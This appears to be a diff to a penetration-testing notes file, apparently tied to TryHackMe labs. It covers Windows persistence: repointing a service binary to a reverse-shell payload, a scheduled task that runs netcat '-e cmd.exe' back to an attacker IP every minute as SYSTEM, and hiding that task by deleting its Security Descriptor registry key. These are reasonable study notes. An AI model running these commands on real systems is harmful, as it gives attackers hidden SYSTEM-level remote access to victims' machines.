@@ -187,3 +187,34 @@ When we have found our service we will want to create a [payload](#reverse-shell
 We then want to place the payload in a folder like `C:\Windows\`. Then we will run the following command to reconfigure the stopped service and have it point to our payload.
 
 `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`
+
+## Abusing Scheduled Tasks
+### Task Scheduler
+We will be using [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) to interact with the task scheduler.
+
+`C:\> schtasks /create /sc minute /mo 1 /tn <Task Name> /tr "<path to netcat> -e cmd.exe <Attacker IP> <port>" /ru SYSTEM`
+
+* `/sc` and `/mo` tells the task to run every minute
+* `/ru` tells the task to run as SYSTEM
+
+We can see the scheduled task by running:
+
+`schtasks /query /tn <task name>`
+
+### Make task invisible
+We don't want the user to see our scheduled tasks. We can do this by deleting the Security Descriptor. It is stored here:
+
+`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
+
+We will need to be SYSTEM to delete the task, so we will need [psexec](../../useful_tools/Windows/README.md#psexec64exe) on the host system.
+
+`C:\> <path to psexec64>/PsExec64.exe -s -i regedit`
+
+Will allow us to make changes in the registry as SYSTEM.
+
+Once you found the scheduled task, delete the SD key.
+
+It will no longer show up when you run:
+
+`schtasks /query /tn <task name>`
+
